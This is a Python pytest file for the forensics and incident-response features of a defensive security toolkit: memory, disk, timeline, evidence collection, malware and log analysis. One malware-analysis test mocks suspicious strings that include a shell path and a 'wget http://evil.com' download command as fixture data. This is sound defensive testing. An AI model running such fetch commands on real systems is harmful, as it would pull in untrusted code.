"""Tests for Forensics & IR category handlers."""

import pytest
from unittest.mock import patch, MagicMock, call

from cyberguard_toolkit import CyberGuardToolkit


class TestMemoryInfo:
    """Tests for _memory_info method."""

    def test_with_proc_and_psutil(self, toolkit, monkeypatch):
        monkeypatch.setattr("cyberguard_toolkit.HAS_PSUTIL", True)

        mock_vmem = MagicMock()
        mock_vmem.total = 17179869184
        mock_vmem.available = 12884901888
        mock_vmem.used = 4294967296
        mock_vmem.percent = 25.0

        mock_swap = MagicMock()
        mock_swap.used = 524288000
        mock_swap.percent = 5.0

        mock_proc = MagicMock()
        mock_mem_info = MagicMock()
        mock_mem_info.rss = 524288000
        mock_proc.info = {
            "pid": 1234,
            "name": "systemd",
            "memory_percent": 5.0,
            "memory_info": mock_mem_info,
        }

        with patch.object(
            toolkit.cmd, "read_proc_file",
            return_value=(
                "MemTotal:       16384000 kB\n"
                "MemFree:         8192000 kB\n"
                "MemAvailable:   12000000 kB\n"
            ),
        ), \
             patch("psutil.virtual_memory", return_value=mock_vmem), \
             patch("psutil.swap_memory", return_value=mock_swap), \
             patch("psutil.process_iter", return_value=[mock_proc]):
            toolkit._memory_info()

    def test_without_psutil(self, toolkit, monkeypatch):
        monkeypatch.setattr("cyberguard_toolkit.HAS_PSUTIL", False)
        with patch.object(toolkit.cmd, "read_proc_file", return_value=None):
            toolkit._memory_info()

    def test_no_proc_meminfo(self, toolkit, monkeypatch):
        monkeypatch.setattr("cyberguard_toolkit.HAS_PSUTIL", False)
        with patch.object(toolkit.cmd, "read_proc_file", return_value=None):
            toolkit._memory_info()


class TestDiskForensics:
    """Tests for _disk_forensics method."""

    def test_full_scan(self, toolkit):
        def run_side_effect(cmd, **kwargs):
            if "lsblk" in cmd:
                return (0, "NAME SIZE TYPE MOUNTPOINT\nsda 50G disk /\n", "")
            if "find" in cmd and "/etc" in cmd:
                return (0, "/etc/passwd\n/var/log/syslog\n", "")
            if "find" in cmd and "/tmp" in cmd:
                return (0, "/tmp/bigfile.bin\n", "")
            return (0, "", "")

        with patch.object(toolkit.cmd, "run", side_effect=run_side_effect), \
             patch("cyberguard_toolkit.Path") as mock_path:
            mock_stat = MagicMock()
            mock_stat.st_size = 52428800
            mock_path.return_value.stat.return_value = mock_stat
            toolkit._disk_forensics()

    def test_no_recent_files(self, toolkit):
        def run_side_effect(cmd, **kwargs):
            if "lsblk" in cmd:
                return (0, "NAME SIZE TYPE\nsda 50G disk\n", "")
            return (0, "", "")

        with patch.object(toolkit.cmd, "run", side_effect=run_side_effect):
            toolkit._disk_forensics()

    def test_lsblk_fails(self, toolkit):
        with patch.object(
            toolkit.cmd, "run",
            return_value=(1, "", "error"),
        ):
            toolkit._disk_forensics()


class TestTimelineAnalyzer:
    """Tests for _timeline_analyzer method."""

    def test_with_etc_changes(self, toolkit):
        with patch.object(
            toolkit.cmd, "run",
            return_value=(
                0,
                "2026-02-10+10:00:00 /etc/passwd\n"
                "2026-02-09+15:30:00 /etc/shadow\n",
                "",
            ),
        ), \
             patch("cyberguard_toolkit.Path") as mock_path, \
             patch.object(toolkit.exporter, "ask_export"):
            mock_path.return_value.exists.return_value = False
            toolkit._timeline_analyzer()

    def test_with_auth_log(self, toolkit, sample_auth_log):
        def path_factory(p):
            mock = MagicMock()
            if "auth" in str(p):
                mock.exists.return_value = True
                mock.read_text.return_value = sample_auth_log
            else:
                mock.exists.return_value = False
            return mock

        with patch.object(
            toolkit.cmd, "run",
            return_value=(1, "", ""),
        ), \
             patch("cyberguard_toolkit.Path", side_effect=path_factory), \
             patch.object(toolkit.exporter, "ask_export"):
            toolkit._timeline_analyzer()

    def test_auth_log_permission_denied(self, toolkit):
        with patch.object(
            toolkit.cmd, "run",
            return_value=(1, "", ""),
        ), \
             patch("cyberguard_toolkit.Path") as mock_path:
            mock_instance = MagicMock()
            mock_instance.exists.return_value = True
            mock_instance.read_text.side_effect = PermissionError("denied")
            mock_path.return_value = mock_instance
            toolkit._timeline_analyzer()


class TestEvidenceCollectorMenu:
    """Tests for _evidence_collector_menu method."""

    def test_no_case_name(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask", return_value=""):
            toolkit._evidence_collector_menu()

    def test_back(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask") as mock_prompt, \
             patch("cyberguard_toolkit.questionary.select") as mock_select:
            mock_prompt.side_effect = ["TestCase", "Examiner"]
            mock_select.return_value.ask.return_value = "Back"
            toolkit._evidence_collector_menu()

    def test_specific_files(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask") as mock_prompt, \
             patch("cyberguard_toolkit.questionary.select") as mock_select, \
             patch.object(
                 toolkit.evidence, "collect_files",
                 return_value={
                     "files": [{"status": "COLLECTED", "path": "/etc/passwd"}],
                     "archive": "/tmp/evidence.tar.gz",
                     "archive_sha256": "abc123",
                 },
             ):
            mock_prompt.side_effect = [
                "TestCase", "Examiner", "/etc/passwd,/etc/shadow",
            ]
            mock_select.return_value.ask.return_value = "Specific files"
            toolkit._evidence_collector_menu()

    def test_log_files(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask") as mock_prompt, \
             patch("cyberguard_toolkit.questionary.select") as mock_select, \
             patch("cyberguard_toolkit.Path") as mock_path, \
             patch.object(
                 toolkit.evidence, "collect_files",
                 return_value={
                     "files": [{"status": "COLLECTED"}],
                     "archive": "/tmp/logs.tar.gz",
                     "archive_sha256": "def456",
                 },
             ):
            mock_prompt.side_effect = ["TestCase", "Examiner"]
            mock_select.return_value.ask.return_value = "Log files"
            mock_log_dir = MagicMock()
            mock_log_dir.exists.return_value = True
            mock_log_dir.glob.side_effect = [
                [MagicMock(__str__=lambda s: "/var/log/syslog")],
                [MagicMock(__str__=lambda s: "/var/log/auth.log")],
            ]
            mock_path.return_value = mock_log_dir
            toolkit._evidence_collector_menu()

    def test_config_files(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask") as mock_prompt, \
             patch("cyberguard_toolkit.questionary.select") as mock_select, \
             patch("cyberguard_toolkit.Path") as mock_path, \
             patch.object(
                 toolkit.evidence, "collect_files",
                 return_value={
                     "files": [{"status": "COLLECTED"}],
                     "archive": "/tmp/config.tar.gz",
                     "archive_sha256": "ghi789",
                 },
             ):
            mock_prompt.side_effect = ["TestCase", "Examiner"]
            mock_select.return_value.ask.return_value = "Config files (/etc)"
            mock_path.return_value.exists.return_value = True
            toolkit._evidence_collector_menu()

    def test_no_files(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask") as mock_prompt, \
             patch("cyberguard_toolkit.questionary.select") as mock_select:
            mock_prompt.side_effect = ["TestCase", "Examiner", ""]
            mock_select.return_value.ask.return_value = "Specific files"
            toolkit._evidence_collector_menu()


class TestMalwareAnalysis:
    """Tests for _malware_analysis method."""

    def test_no_filepath(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask", return_value=""):
            toolkit._malware_analysis()

    def test_file_not_found(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask", return_value="/nonexistent"), \
             patch("cyberguard_toolkit.Path") as mock_path:
            mock_path.return_value.exists.return_value = False
            mock_path.return_value.strip = MagicMock(return_value="/nonexistent")
            toolkit._malware_analysis()

    def test_full_analysis(self, toolkit, tmp_path):
        test_file = tmp_path / "test_binary"
        test_file.write_bytes(b"\x7fELF" + b"\x00" * 100)

        def run_side_effect(cmd, **kwargs):
            if "file" in cmd:
                return (0, f"{test_file}: ELF 64-bit", "")
            if "strings" in cmd:
                return (0, "some\nstrings\nhere\n", "")
            if "objdump" in cmd:
                return (0, "linux-vdso.so.1\n", "")
            return (0, "", "")

        with patch("cyberguard_toolkit.Prompt.ask", return_value=str(test_file)), \
             patch.object(toolkit.cmd, "has_command", return_value=True), \
             patch.object(toolkit.cmd, "run", side_effect=run_side_effect), \
             patch.object(toolkit.config, "has_api_key", return_value=False), \
             patch.object(toolkit.exporter, "ask_export"):
            toolkit._malware_analysis()

    def test_analysis_with_suspicious_strings(self, toolkit, tmp_path):
        test_file = tmp_path / "suspicious"
        test_file.write_bytes(b"\x00" * 50)

        def run_side_effect(cmd, **kwargs):
            if "file" in cmd:
                return (0, f"{test_file}: data", "")
            if "strings" in cmd:
                return (0, "/bin/sh\nconnect\nexec\nwget http://evil.com\n", "")
            if "objdump" in cmd:
                return (0, "", "")
            return (0, "", "")

        with patch("cyberguard_toolkit.Prompt.ask", return_value=str(test_file)), \
             patch.object(toolkit.cmd, "has_command", return_value=True), \
             patch.object(toolkit.cmd, "run", side_effect=run_side_effect), \
             patch.object(toolkit.config, "has_api_key", return_value=False), \
             patch.object(toolkit.exporter, "ask_export"):
            toolkit._malware_analysis()

    def test_analysis_with_vt_lookup(self, toolkit, tmp_path):
        test_file = tmp_path / "check_vt"
        test_file.write_bytes(b"\x00" * 50)

        with patch("cyberguard_toolkit.Prompt.ask", return_value=str(test_file)), \
             patch.object(toolkit.cmd, "has_command", return_value=False), \
             patch.object(toolkit.config, "has_api_key", return_value=True), \
             patch("cyberguard_toolkit.Confirm.ask", return_value=True), \
             patch.object(
                 toolkit.threat_intel, "vt_hash_reputation",
                 return_value={
                     "data": {
                         "attributes": {
                             "last_analysis_stats": {
                                 "malicious": 5,
                                 "suspicious": 5,
                                 "harmless": 50,
                             }
                         }
                     }
                 },
             ), \
             patch.object(toolkit.exporter, "ask_export"):
            toolkit._malware_analysis()


class TestLogCorrelator:
    """Tests for _log_correlator method."""

    def test_with_all_sources(self, toolkit, sample_auth_log):
        def path_factory(p):
            mock = MagicMock()
            if "auth" in str(p):
                mock.exists.return_value = True
                mock.read_text.return_value = sample_auth_log
            else:
                mock.exists.return_value = False
            return mock

        with patch("cyberguard_toolkit.Path", side_effect=path_factory), \
             patch.object(
                 toolkit.cmd, "run",
                 return_value=(
                     0,
                     'ESTAB 0 0 10.0.0.1:80 10.0.0.2:443 users:(("nginx"))\n',
                     "",
                 ),
             ), \
             patch.object(toolkit.exporter, "ask_export"):
            toolkit._log_correlator()

    def test_no_logs(self, toolkit):
        with patch("cyberguard_toolkit.Path") as mock_path, \
             patch.object(
                 toolkit.cmd, "run",
                 return_value=(1, "", ""),
             ):
            mock_path.return_value.exists.return_value = False
            toolkit._log_correlator()

    def test_permission_denied(self, toolkit):
        with patch("cyberguard_toolkit.Path") as mock_path, \
             patch.object(
                 toolkit.cmd, "run",
                 return_value=(1, "", ""),
             ):
            mock_instance = MagicMock()
            mock_instance.exists.return_value = True
            mock_instance.read_text.side_effect = PermissionError("denied")
            mock_path.return_value = mock_instance
            toolkit._log_correlator()


class TestVolatileDataCapture:
    """Tests for _volatile_data_capture method."""

    def test_capture(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask", return_value="ir_case_001"), \
             patch.object(
                 toolkit.evidence, "capture_volatile_data",
                 return_value={
                     "sections": {
                         "date": {
                             "return_code": 0,
                             "output": "Tue Feb 10 10:00:00 UTC 2026",
                         },
                         "who": {
                             "return_code": 0,
                             "output": "user pts/0",
                         },
                         "ps": {
                             "return_code": 0,
                             "output": "PID TTY",
                         },
                         "ss": {
                             "return_code": 0,
                             "output": "ESTAB",
                         },
                     }
                 },
             ):
            toolkit._volatile_data_capture()

    def test_capture_default_name(self, toolkit):
        with patch("cyberguard_toolkit.Prompt.ask", return_value=""), \
             patch.object(
                 toolkit.evidence, "capture_volatile_data",
                 return_value={
                     "sections": {
                         "date": {
                             "return_code": 0,
                             "output": "now",
                         }
                     }
                 },
             ):
            toolkit._volatile_data_capture()
